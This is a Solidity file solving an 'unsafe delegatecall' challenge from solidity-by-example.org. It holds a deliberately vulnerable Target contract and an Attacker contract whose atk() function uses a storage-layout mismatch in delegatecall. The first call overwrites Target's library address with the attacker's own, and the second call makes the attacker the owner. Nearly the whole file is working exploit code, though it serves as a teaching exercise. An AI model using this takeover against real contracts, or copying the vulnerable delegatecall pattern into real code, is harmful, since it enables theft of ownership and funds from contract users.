/*
  * A solution of unsafe delegate call challenge at solidity-by-example.org
  * Task is to update the owner variable in the Target contract
*/

// SPDX-License-Identifier: MIT
pragma solidity 0.8.13;

contract Delegate {
    uint public someNumber; // Different state variable declaration order than `Target` contract
    // Actually updating the first variable in `Target` contract, that is, the lib address

    function doSomething(uint _num) public {
        someNumber = _num;
    }
}

contract Target {
    address public lib;
    address public owner;
    uint public someNumber;

    constructor(address _lib) {
        lib = _lib;
        owner = msg.sender;
    }

    function doSomething(uint _num) public {
        lib.delegatecall(abi.encodeWithSignature("doSomething(uint256)", _num));
    }
}


contract Attacker {
    address public lib;
    address public owner;
    uint public someNumber;
    Target target;

    constructor(address _target) {
        target = Target(_target);
    }

    function atk() external {
      target.doSomething(uint160(address(this)));
      target.doSomething(0);
    }

    function doSomething(uint _num) public {
        owner = msg.sender;
        _num;
    }
}
